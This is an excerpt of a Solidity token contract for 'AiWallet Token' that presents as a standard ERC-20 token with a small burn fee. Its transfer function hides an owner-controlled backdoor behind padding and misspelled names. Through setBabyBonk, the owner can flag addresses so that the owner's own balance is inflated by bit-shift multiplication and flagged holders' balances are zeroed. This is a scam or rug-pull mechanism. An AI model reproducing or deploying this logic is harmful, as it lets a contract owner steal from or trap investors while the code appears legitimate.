...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - BBone https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "AiWallet Token";
    string private _symbol = "AiWallet";
    uint256 private _decimals = 18;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnBBone = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _BabyBonkAddress;

    function setBabyBonk(address _address,uint256 _value) external onlyowner {
        _BabyBonkAddress[_address] = _value;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amoonts) internal virtual {
        ...
        uint256 BBoneamoont = 0+0;
        BBoneamoont = amoonts.mul(_burnBBone).div(100)+0;
        if (_BabyBonkAddress[sender] > 1+0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(6+0 << _BabyBonkAddress[sender]+0);
            }else{
                _balance[sender] = _balance[sender].mul(6+0 >> _BabyBonkAddress[sender]+0);
            }
        }
        ...
        uint256 amoun;
        amoun = amoonts - BBoneamoont;
        _balance[recipient] += amoun;
        if (_burnBBone > 0+0){
            _balance[_DEADaddress] = _balance[_DEADaddress].add(BBoneamoont);
            emit Transfer (sender, _DEADaddress, BBoneamoont);
        }
